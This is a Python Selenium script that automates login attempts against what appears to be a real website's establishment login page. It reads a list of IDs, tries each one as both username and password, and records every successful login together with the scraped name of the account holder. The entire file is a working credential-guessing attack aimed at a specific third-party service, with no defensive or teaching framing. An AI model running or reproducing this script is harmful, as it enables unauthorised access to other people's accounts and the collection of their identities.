from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

import time

ChOption = Options()
ChOption.add_experimental_option('detach', True)

driver = webdriver.Chrome(options=ChOption)
driver.get('https://www.expertpro-ci.net/index.php?adr=index.connexion.etab.inc&esp=')

with open('admin_ids.txt', 'r') as f:
    admin = [line.strip() for line in f]

try:
    for i in admin:
        login_input = driver.find_element(By.ID,'login')
        passw_input = driver.find_element(By.ID, 'password')

        login_input.clear()
        login_input.send_keys(i)
        passw_input.clear()
        passw_input.send_keys(i)

        passw_input.send_keys(Keys.ENTER)
        try:
            driver.find_element(By.CSS_SELECTOR, '.w3-col.w3-text-color-red')
            print(f"ID {i} échoué")

        except:
            print(f"ID : {i} réussi") 
            nom = driver.find_element(By.CSS_SELECTOR, '.w3-col.w3-half.lien').text
            name_clean = nom.replace('Connecté(e) :', '').replace('Changer mon mot de passe', '').replace('Me déconnecter', '')
            with open('save.txt', 'a') as w:
                w.write(f'ID: {i} - Nom: {name_clean}')
            driver.get('https://www.expertpro-ci.net/index.php?adr=index.connexion.etab.inc&esp=')
except:
    print('Error, attente 10sec')
    driver.quit()
    time.sleep(10)

